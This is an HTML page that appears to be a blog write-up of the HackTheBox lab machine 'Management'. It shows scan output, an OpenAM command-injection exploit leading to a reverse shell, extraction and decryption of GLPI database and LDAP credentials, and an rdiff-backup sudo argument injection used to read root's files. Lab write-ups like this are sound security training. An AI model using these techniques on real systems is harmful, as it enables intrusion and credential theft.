@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Management - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Management (Easy, Linux) write up: OpenAM command injection, GLPI credential recovery, and rdiff-backup path restriction bypass."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--border:rgba(255,255,255,.06);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280;--purple:#c084fc;--emerald:#34d399}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08),transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.icon-sm{width:14px;height:14px}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;overflow:hidden}.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}h1{font-size:1.75rem;font-weight:800;text-transform:uppercase;margin-bottom:1.5rem}@media(min-width:768px){h1{font-size:2.5rem}}
+h2{font-size:1.25rem;color:var(--purple);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}p,li{color:var(--muted);font-size:.95rem;line-height:1.75}p{margin-bottom:1rem}ul{margin:0 0 1rem 1.25rem}li{margin-bottom:.25rem}strong{color:var(--text)}code{font-family:monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:var(--purple);padding:2px 6px;border-radius:6px}pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font: .8rem/1.6 monospace;color:var(--emerald);white-space:pre-wrap;overflow-wrap:anywhere}.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}.lbl{color:var(--dim);font: .65rem monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}.val{font-size:.9rem;font-weight:600}.tag{display:inline-block;padding:2px 10px;border-radius:9999px;font:.7rem monospace;letter-spacing:.1em;text-transform:uppercase}.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:var(--emerald)}.tag-linux{background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.3);color:var(--purple)}.footer{text-align:center;padding-top:3rem;color:var(--dim);font:10px monospace;letter-spacing:.15em;text-transform:uppercase}
+</style>
+</head>
+<body><div class="cyber-grid"></div><main><div class="max-w">
+<div class="nav-row"><a href="../writeups.html" class="back-btn"><svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>Write Ups</a><a href="../index.html" class="back-btn">Home</a></div>
+<div class="panel"><div class="writeup-body">
+<p class="meta">hackthebox / easy / linux</p><h1>Management</h1>
+<div class="info-grid"><div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div><div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="tag tag-easy">Easy</span></div></div><div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="tag tag-linux">Linux</span></div></div></div>
+
+<h2>Summary</h2><p>Management is an easy Linux box exposing an OpenAM instance on a discovered SSO virtual host. A password-reset command injection provides an initial shell as <code>openam</code>. Credentials in GLPI's LDAP configuration lead to user <code>owen</code>, whose sudo rule permits an <code>rdiff-backup</code> argument injection and unrestricted file recovery as root.</p>
+
+<h2>Enumeration</h2>
+<pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-13 06:14 -0400
+Nmap scan report for management.htb (10.129.68.47)
+Host is up (0.11s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://management.htb/
+443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
+| tls-alpn:
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Management \xE2\x80\x94 Managed IT &amp; Infrastructure
+| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
+| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
+| Not valid before: 2026-06-02T01:21:44
+|_Not valid after:  2126-05-09T01:21:44
+4444/tcp  open  ssl/ldap
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
+| Not valid before: 2026-06-02T01:23:59
+|_Not valid after:  2046-05-28T01:23:59
+| fingerprint-strings:
+|   LDAPSearchReq:
+|     0&lt;0:
+|     objectClass1+
+|     ds-root-dse
+|_    ds-cfg-root-dse-backend0
+50389/tcp open  ldap     (Anonymous bind OK)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4444-TCP:V=7.98%T=SSL%I=7%D=9/13%Time=6AA677AB%P=x86_64-pc-linux-gnu%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000&lt;0:\x04\x0bobjectClass1\x+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.13 seconds</pre>
+<p>Vhosts - https://10.129.68.47:443</p>
+<pre>ffuf -s -u https://10.129.68.47 -H 'Host: FUZZ.management.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 15 -timeout 5 -fc 404,400 -ac -noninteractive -k
+sso</pre>
+<p>Go to <code>sso.management.htb</code>. OpenAM login page. Look for a CVE: <a href="https://github.com/infernosalex/CVE-2026-33439-Python-PoC">https://github.com/infernosalex/CVE-2026-33439-Python-PoC</a></p>
+
+<h2>Foothold</h2>
+<pre>python exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
+
+[+] HTTP 200
+uid=996(openam) gid=987(openam) groups=987(openam)</pre>
+<p>Craft a RCE payload and get a reverse shell:</p>
+<pre>python exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'echo "&lt;base64_encoded_payload&gt;" | base64 -d | sh'</pre>
+<p>We have a shell as <code>openam</code>.</p>
+
+<h2>Lateral Movement</h2>
+<pre>openam@management:/opt/glpi/config$ cat config_db.php
+cat config_db.php
+&lt;?php
+class DB extends DBmysql {
+   public $dbhost = '127.0.0.1';
+   public $dbuser = 'glpi';
+   public $dbpassword = '8rhu0L6Pw4Y7';
+   public $dbdefault = 'glpidb';
+   public $use_utf8mb4 = true;
+   public $allow_datetime = false;
+   public $allow_signed_keys = false;
+}</pre>
+<pre>mysql -u glpi -p'8rhu0L6Pw4Y7' -h 127.0.0.1
+
+select id,name,password from glpi_users;
++----+-------------+--------------------------------------------------------------+
+| id | name        | password                                                     |
++----+-------------+--------------------------------------------------------------+
+|  2 | glpi        | $2y$10$XbpKpVeQdlzK9Z6ld0aDUulxAS5s6Y.Lc/CtHldOVIlAKNqP7BY1G |
+|  3 | post-only   | $2y$10$2.DfnJoLnGf4ZiFGMLHYiuVDMwMHKlvwbRvlXE6ZAxwzevQBqNOI2 |
+|  4 | tech        | $2y$10$qXRfoBja9A82RlrJLZuTB.NNVbTyRsjId4xMnthAwUCX/fNnuXoLe |
+|  5 | normal      | $2y$10$vsU3M49DpDxr4rHFLzyU0.0mjYMqg1EtK4vY7e8E759SgDWAX208K |
+|  6 | glpi-system |                                                              |
++----+-------------+--------------------------------------------------------------+
+Dead end!
+
+select name, rootdn_passwd from glpi_authldaps;
++----------------------+--------------------------------------------------------------------------+
+| name                 | rootdn_passwd                                                            |
++----------------------+--------------------------------------------------------------------------+
+| Management Directory | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== |
++----------------------+--------------------------------------------------------------------------+</pre>
+<p>Decrypt the password using the readable <code>glpicrypt.key</code>.</p>
+<pre>php -r '
+$key = file_get_contents("/opt/glpi/config/glpicrypt.key");
+$enc = base64_decode("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");
+$nonce = substr($enc, 0, 24);
+$ciphertext = substr($enc, 24);
+$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(
+    $ciphertext,
+    $nonce,
+    $nonce,
+    $key
+);
+echo $plain . PHP_EOL;
+'</pre>
+<p>The password is <code>WpczC40GhTbk</code> getting access to <code>owen</code>. Get the user flag.</p>
+
+<h2>Privilege Escalation</h2>
+<pre>sudo -l
+
+User owen may run the following commands on management:
+    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *</pre>
+<p>Sudo rule likely allows argument injection after fixed options. Test whether later <code>--restrict-path /</code> overrides <code>/opt/backup</code>:</p>
+<pre>sudo /usr/bin/rdiff-backup \
+--server \
+--restrict-path /opt/backup \
+--restrict-mode read-only \
+--restrict-path /</pre>
+<p>It will appear to hang because server mode waits for rdiff-backup protocol. Stop with Ctrl-C.</p>
+<p>Use client mode to retrieve files, install rdiff-backup on your machine and run:</p>
+<pre>mkdir /tmp/restore
+rdiff-backup \
+--remote-schema 'ssh %s sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *' \
+owen@management.htb::/ \
+/tmp/restore</pre>
+<p>If override works, change the remote command to include a final <code>--restrict-path /</code>:</p>
+<pre>rdiff-backup \
+  --remote-schema 'ssh %s sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /' \
+  owen@management.htb::/root \
+  /tmp/restore</pre>
+<p>Go into <code>/tmp/restore</code> and get the root flag!</p>
+
+<h2>Key Takeaways</h2><ul><li>Enumerate virtual hosts when the primary web service redirects to HTTPS.</li><li>Review application configuration for encrypted secrets and locate the application key used to decrypt them.</li><li>Validate every argument permitted by wildcard sudo rules, especially repeated restriction options.</li></ul>
+</div></div><p class="footer">pumkin / write ups</p>
+</div></main></body></html>
